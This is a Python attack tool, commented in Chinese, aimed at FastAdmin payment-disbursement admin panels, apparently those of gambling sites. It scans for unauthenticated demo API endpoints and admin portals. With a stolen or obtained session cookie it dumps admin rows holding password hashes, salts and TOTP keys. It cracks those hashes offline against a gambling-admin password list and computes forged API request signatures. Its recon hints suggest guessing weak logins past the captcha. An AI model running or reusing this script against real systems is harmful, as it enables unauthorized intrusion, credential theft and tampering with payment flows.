#!/usr/bin/env python3
"""FastAdmin 代付/下发/卡商探针。

对齐：传承/快府·代付.md
默认：指纹 + /api/demo 未授权 + backend JS 路由。
有 Cookie 才 dump-part。crack / sign 纯本地。

示例:
  python3 炼蛊房/fastadmin_daifu_probe.py recon --base https://授权 --case <案卷> --insecure
  python3 炼蛊房/fastadmin_daifu_probe.py dump-part --base https://授权 --case <案卷> --cookie 'PHPSESSID=…' --portal ks
  python3 炼蛊房/fastadmin_daifu_probe.py crack --hash-file …/part_rows.json --wordlist dict/gambling_admin_passwords.txt
"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-fastadmin_daifu_probe"

PORTALS = ("/sh.php", "/ks.php", "/df.php", "/admin.php", "/index.php?s=/admin")
STATIC_HINTS = (
    "/assets/js/backend.js",
    "/assets/js/backend/backend.js",
    "/assets/js/require-backend.js",
    "/composer.json",
    "/composer.lock",
    "/index.php?s=/captcha",
)
DEMO_PATHS = (
    "/api/demo/getChannels",
    "/api/demo/getChannelGroup",
    "/api/demo/getuserpartmch",
    "/api/demo/getKs",
    "/api/demo/getuserpart",
    "/api/demo/getmoney/id/1",
    "/api/demo/getpc/banknumber/1",
    "/api/demo/backOrder",
    "/api/demo/selfBack",
    "/api/demo/index",
)
JS_CANDIDATES = (
    "/assets/js/backend.js",
    "/assets/js/require-backend.js",
    "/assets/js/backend/backend.js",
    "/assets/js/backend/index.js",
    "/assets/js/backend/part.js",
    "/assets/js/backend/makemoney.js",
    "/assets/js/backend/auth/admin.js",
)
URL_RE = re.compile(r"""(?:url|href)\s*[:=]\s*['"]([^'"]+)['"]""")
PATH_RE = re.compile(r"""(?P<p>/(?:api/)?[A-Za-z0-9_.\-]+(?:/[A-Za-z0-9_.\-]+){0,6})""")
SENSITIVE_KEYS = (
    "password", "salt", "google_key", "apikey", "api_key", "token",
    "secret", "totp",
)



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "fastadmin_daifu"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not h:
        raise SystemExit("[scope] 无法解析 host")
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝请求")


def ssl_ctx(insecure: bool) -> ssl.SSLContext:
    return ssl._create_unverified_context() if insecure else ssl.create_default_context()


def normalize_base(base: str) -> str:
    b = base.strip().rstrip("/")
    if "://" not in b:
        b = "https://" + b
    return b


def http(
    url: str,
    *,
    method: str = "GET",
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    insecure: bool = False,
    timeout: float = 18,
) -> dict[str, Any]:
    hdrs = {
        "User-Agent": UA,
        "Accept": "text/html,application/json,*/*",
        "X-Requested-With": "XMLHttpRequest",
    }
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, context=ssl_ctx(insecure), timeout=timeout) as resp:
            body = resp.read(1_500_000)
            return {
                "ok": True,
                "status": resp.status,
                "headers": {k.lower(): v for k, v in resp.headers.items()},
                "body": body.decode("utf-8", errors="replace"),
                "url": getattr(resp, "url", url) or url,
            }
    except urllib.error.HTTPError as e:
        body = e.read(1_500_000) if e.fp else b""
        return {
            "ok": False,
            "status": e.code,
            "headers": {k.lower(): v for k, v in (e.headers.items() if e.headers else [])},
            "body": body.decode("utf-8", errors="replace"),
            "url": url,
            "error": str(e),
        }
    except Exception as e:
        return {"ok": False, "status": 0, "headers": {}, "body": "", "url": url, "error": str(e)}


def save(case: str, name: str, obj: Any) -> Path:
    p = case_dir(case) / name
    p.write_text(json.dumps(obj, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return p


def redact(s: str, keep: int = 4) -> str:
    if not s or len(s) <= keep:
        return "***"
    return s[:2] + "…" + s[-keep:]


def fa_hash(password: str, salt: str) -> str:
    inner = hashlib.md5(password.encode("utf-8", errors="replace")).hexdigest()
    return hashlib.md5((inner + salt).encode("utf-8", errors="replace")).hexdigest()


def fa_sign(params: dict[str, Any], apikey: str) -> tuple[str, str]:
    items = []
    for k in sorted(params.keys()):
        if k.lower() in ("sign", "sign_type"):
            continue
        v = params[k]
        if v is None or v == "":
            continue
        items.append(f"{k}={v}")
    raw = "&".join(items) + "&key=" + apikey
    return hashlib.md5(raw.encode("utf-8")).hexdigest().upper(), raw


def _interesting_body(body: str, status: int) -> bool:
    if status in (0, 403, 404, 444, 429, 502, 503):
        return False
    if status not in (200, 201, 204) and status < 300:
        return False
    b = (body or "").strip()
    if len(b) < 8:
        return False
    if b.startswith("<") and "fastadmin" not in b.lower() and "login" not in b.lower():
        return "sh.php" in b or "ks.php" in b
    return True


def cmd_recon(args: argparse.Namespace) -> int:
    base = normalize_base(args.base)
    ensure_scope(base)
    out: dict[str, Any] = {
        "ts": _now(),
        "base": base,
        "portals": [],
        "static": [],
        "demo": [],
        "js_routes": [],
        "next": [],
    }
    print(f"[*] recon {base}")
    for path in PORTALS:
        r = http(base + path, insecure=args.insecure)
        hit = r.get("status") in (200, 302) and (
            "password" in (r.get("body") or "").lower()
            or "captcha" in (r.get("body") or "").lower()
            or "fastadmin" in (r.get("body") or "").lower()
            or "__token__" in (r.get("body") or "")
        )
        rec = {"path": path, "status": r.get("status"), "hit": hit, "len": len(r.get("body") or "")}
        out["portals"].append(rec)
        mark = "HIT" if hit else str(r.get("status"))
        print(f"  portal {path} → {mark}")

    for path in STATIC_HINTS:
        r = http(base + path, insecure=args.insecure)
        body = r.get("body") or ""
        hit = r.get("status") == 200 and len(body) > 40
        rec = {"path": path, "status": r.get("status"), "hit": hit, "len": len(body)}
        if path.endswith("composer.json") and hit:
            rec["composer_name"] = (json.loads(body).get("name") if body.startswith("{") else None)
        out["static"].append(rec)
        if hit:
            print(f"  static HIT {path} len={len(body)}")

    for path in DEMO_PATHS:
        r = http(base + path, insecure=args.insecure)
        body = r.get("body") or ""
        hit = _interesting_body(body, int(r.get("status") or 0)) and not body.lstrip().startswith("<!DOCTYPE")
        rec = {
            "path": path,
            "status": r.get("status"),
            "hit": hit,
            "len": len(body),
            "snippet": body[:240],
        }
        out["demo"].append(rec)
        if hit:
            print(f"  demo HIT {path} status={r.get('status')} len={len(body)}")

    routes: set[str] = set()
    for path in JS_CANDIDATES:
        r = http(base + path, insecure=args.insecure)
        body = r.get("body") or ""
        if r.get("status") != 200 or len(body) < 80:
            continue
        for m in URL_RE.findall(body):
            if m.startswith("/") or m.startswith("http"):
                routes.add(m.split("?")[0][:120])
        for m in PATH_RE.findall(body):
            if any(k in m for k in ("part", "makemoney", "wallet", "settle", "recharge", "demo", "auth")):
                routes.add(m[:120])
        print(f"  js {path} len={len(body)} routes+={len(routes)}")
    out["js_routes"] = sorted(routes)[:200]

    if any(x.get("hit") for x in out["demo"]):
        out["next"].append("L1 demo 未授权成立 → 记通道/代理名单；动作面最小验证")
    if out["js_routes"]:
        out["next"].append("backend JS 已出路由 → 对照 part/makemoney/结算口")
    if any(x.get("hit") for x in out["portals"]):
        out["next"].append("有登录页 → OCR captcha 试弱口 / 自建下级；进门后 dump-part")
    if not out["next"]:
        out["next"].append("未命中 FastAdmin 代付面 → 回 ThinkPHP手法 或 epay-admin")
    out["next"].append("有身份必须填 案卷/object_matrix.md；multi money ≠ 结算余额")

    p = save(args.case, "recon.json", out)
    print(f"[+] {p}")
    for n in out["next"]:
        print(f"  next: {n}")
    return 0


def cmd_dump_part(args: argparse.Namespace) -> int:
    base = normalize_base(args.base)
    ensure_scope(base)
    portal = (args.portal or "ks").strip().lstrip("/")
    if not portal.endswith(".php"):
        portal = portal + ".php"
    cookie = (args.cookie or "").strip()
    if not cookie:
        raise SystemExit("dump-part 需要 --cookie")
    rows: list[dict[str, Any]] = []
    raw_pages: list[dict[str, Any]] = []
    for offset in range(0, args.limit, 50):
        path = f"/{portal}/part/index?offset={offset}&limit=50"
        r = http(
            base + path,
            insecure=args.insecure,
            headers={"Cookie": cookie, "Referer": base + f"/{portal}"},
        )
        body = r.get("body") or ""
        raw_pages.append({"path": path, "status": r.get("status"), "len": len(body)})
        try:
            data = json.loads(body)
        except Exception:
            print(f"[!] {path} 非 JSON status={r.get('status')} snippet={body[:160]!r}")
            break
        rows_page = data.get("rows") or data.get("data") or data.get("list") or []
        if isinstance(data, list):
            rows_page = data
        if not isinstance(rows_page, list) or not rows_page:
            break
        rows.extend(x for x in rows_page if isinstance(x, dict))
        if len(rows_page) < 50:
            break
    redacted = []
    for row in rows:
        item = {}
        for k, v in row.items():
            lk = str(k).lower()
            if lk in SENSITIVE_KEYS and isinstance(v, str) and v:
                item[k] = redact(v)
                item[f"{k}_len"] = len(v)
            else:
                item[k] = v
        redacted.append(item)
    out = {
        "ts": _now(),
        "base": base,
        "portal": portal,
        "count": len(rows),
        "pages": raw_pages,
        "sensitive_fields_seen": sorted({
            k for row in rows for k in row.keys() if str(k).lower() in SENSITIVE_KEYS
        }),
        "rows_redacted": redacted,
        "note": "完整 hash/salt/google_key 只在 part_rows.json（本地）；STATUS 用本文件",
    }
    save(args.case, "part_index_redacted.json", out)
    save(args.case, "part_rows.json", {"ts": _now(), "count": len(rows), "rows": rows})
    print(f"[+] dump-part count={len(rows)} fields={out['sensitive_fields_seen']}")
    print("    完整行 → 案卷/fastadmin_daifu/part_rows.json（勿提交 git）")
    if out["sensitive_fields_seen"]:
        print("    next: crack --hash-file …/part_rows.json")
    else:
        print("    next: 列表无 hash/salt → 换 portal 或确认会话")
    return 0


def _iter_hash_rows(obj: Any) -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    if isinstance(obj, dict):
        if "rows" in obj and isinstance(obj["rows"], list):
            src = obj["rows"]
        elif "cracked" in obj:
            return []
        else:
            src = [obj]
    elif isinstance(obj, list):
        src = obj
    else:
        return rows
    for row in src:
        if not isinstance(row, dict):
            continue
        pw = str(row.get("password") or row.get("hash") or row.get("password_hash") or "")
        salt = str(row.get("salt") or "")
        user = str(row.get("username") or row.get("user") or row.get("id") or "")
        if pw and salt and len(pw) == 32:
            rows.append({"username": user, "hash": pw, "salt": salt})
    return rows


def cmd_crack(args: argparse.Namespace) -> int:
    hp = Path(args.hash_file)
    if not hp.is_file():
        raise SystemExit(f"找不到 {hp}")
    obj = json.loads(hp.read_text(encoding="utf-8"))
    targets = _iter_hash_rows(obj)
    words: list[str] = []
    if args.wordlist:
        wp = Path(args.wordlist)
        if not wp.is_file():
            wp = ENGINE / args.wordlist
        if wp.is_file():
            words = [ln.strip() for ln in wp.read_text(encoding="utf-8", errors="replace").splitlines()
                     if ln.strip() and not ln.startswith("#")]
    words.extend([
        "123456", "admin", "admin123", "admin888", "a123456", "Aa123456",
        "888888", "666666", "111111", "password", "qwerty",
    ])
    # 去重保序
    seen: set[str] = set()
    uniq = []
    for w in words:
        if w not in seen:
            seen.add(w)
            uniq.append(w)
    cracked = []
    for t in targets:
        hit = None
        for w in uniq:
            if fa_hash(w, t["salt"]) == t["hash"].lower():
                hit = w
                break
        rec = {**t, "cracked": bool(hit), "password": hit}
        cracked.append(rec)
        flag = "CRACKED" if hit else "miss"
        print(f"  {flag} {t['username'] or '?'}")
    out = {
        "ts": _now(),
        "algo": "md5(md5(password)+salt)",
        "tried": len(uniq),
        "targets": len(targets),
        "hits": sum(1 for x in cracked if x["cracked"]),
        "rows": cracked,
    }
    dest_case = args.case
    if dest_case:
        p = save(dest_case, "offline_crack.json", out)
        print(f"[+] {p} hits={out['hits']}/{out['targets']}")
    else:
        print(json.dumps({"hits": out["hits"], "targets": out["targets"]}, ensure_ascii=False))
    return 0


def cmd_sign(args: argparse.Namespace) -> int:
    params = json.loads(args.params)
    if not isinstance(params, dict):
        raise SystemExit("--params 必须是 JSON 对象")
    sig, raw = fa_sign(params, args.apikey)
    print(f"raw={raw}")
    print(f"sign={sig}")
    if args.case:
        save(args.case, "sign_sample.json", {
            "ts": _now(),
            "params": params,
            "sign": sig,
            "note": "apikey 未落盘",
        })
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="FastAdmin 代付/卡商探针（授权范围内）")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("recon", help="入口 + demo 未授权 + backend JS")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(func=cmd_recon)

    p = sub.add_parser("dump-part", help="登录后拖 part/index（完整行仅本地）")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--cookie", required=True)
    p.add_argument("--portal", default="ks", help="ks / sh / df")
    p.add_argument("--limit", type=int, default=200)
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(func=cmd_dump_part)

    p = sub.add_parser("crack", help="离线 md5(md5(pass)+salt)")
    p.add_argument("--hash-file", required=True)
    p.add_argument("--wordlist", default="dict/gambling_admin_passwords.txt")
    p.add_argument("--case", default="")
    p.set_defaults(func=cmd_crack)

    p = sub.add_parser("sign", help="试算 sorted+key 大写 MD5")
    p.add_argument("--params", required=True)
    p.add_argument("--apikey", required=True)
    p.add_argument("--case", default="")
    p.set_defaults(func=cmd_sign)

    args = ap.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    sys.exit(main())
